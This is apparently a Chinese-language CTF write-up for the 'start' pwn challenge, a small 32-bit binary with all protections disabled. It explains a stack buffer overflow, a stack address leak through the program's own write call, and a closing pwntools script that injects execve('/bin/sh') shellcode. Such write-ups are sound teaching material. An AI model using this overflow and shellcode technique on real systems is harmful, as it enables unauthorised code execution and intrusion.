checksec会发现是一个安全机制全关的程序

![image-20201124212140407](https://static.hack1s.fun/images/2021/02/06/image-20201124212140407.png)

这个程序本身很短

![image-20201124211033313](https://static.hack1s.fun/images/2021/02/06/image-20201124211033313.png)

start部分就这么短

这里就调用了一个write，输出了0x14的字符，之后就read了0x3c的字符

这里在ret之前将esp+14h

也就是说在输入的这个位置就是返回值了

```
 |<--- 				    ||							   --->|
esp						ra(esp+0x14)					 esp+0x3c
```

我们直接可以控制返回地址，并且由于程序没有开启NX可以直接在栈上写数据

程序没有开启随机化，栈的地址还是固定的，直接调试看到

![image-20210410194158266](https://static.hack1s.fun/images/2021/04/10/image-20210410194158266.png)

栈里面除了字符串就直接是返回地址exit了

![image-20210410202636198](https://static.hack1s.fun/images/2021/04/10/image-20210410202636198.png)

程序运行到ret的之后可以看到栈上的内容正好是`esp+4`的地址

可以直接覆盖返回地址为调用write的那一块代码，因为write会直接输出栈上的内容

这样我们就可以泄漏栈地址

那么后面就直接调用execve的syscall

试了一下使用shellcraft的sh，长度超了，找了一个短一些的版本

```python
from pwn import *

io = remote('node3.buuoj.cn',25760)
#  io = process('./start')

payload = b'a'*0x14 + p32(0x8048087)
io.send(payload)
io.recvuntil(':')
stack_addr = u32(io.recv(4))

payload = b'a'*0x14 + p32(stack_addr+0x14)                                                                                                                                                                     
payload = payload + asm("xor ecx, ecx\n mul ecx\n push ecx\n push 0x68732f2f\n push 0x6e69622f \n mov ebx, esp\n mov al, 0xb\n int 0x80")

io.send(payload)

io.interactive()
```



